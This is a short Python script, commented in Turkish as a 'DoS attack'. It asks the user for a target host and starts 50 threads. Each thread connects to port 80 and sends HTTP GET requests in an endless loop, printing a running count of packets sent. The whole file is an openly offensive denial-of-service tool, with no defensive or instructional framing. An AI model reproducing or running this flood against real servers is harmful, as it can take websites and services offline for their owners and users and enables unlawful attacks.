from threading import Thread
import socket, sys

# Dos Saldırısı

class Dos:
    def __init__(self, target):
        self.target = target
        self.port = 80
        self.total = 0
        self.limit = 500
        self.thread_count = 50
        self.Run()

    def Attack(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((self.target, self.port))
            while True:
                requests = f"GET / HTTP/1.1\r\nHosts: {self.target}\r\n\r\n".encode("ascii")
                s.send(requests)
                self.total += 1
                if self.total % self.limit == 0:
                    print(f"{self.total} pack sended")
            s.close()

    def Run(self):
        threads = []
        
        for i in range(self.thread_count):
            thread = Thread(target=self.Attack)
            threads.append(thread)

        for theard in threads:
            theard.start()

        for theard in threads:
            theard.join()


target = input("Enter target: ")
dos = Dos(target)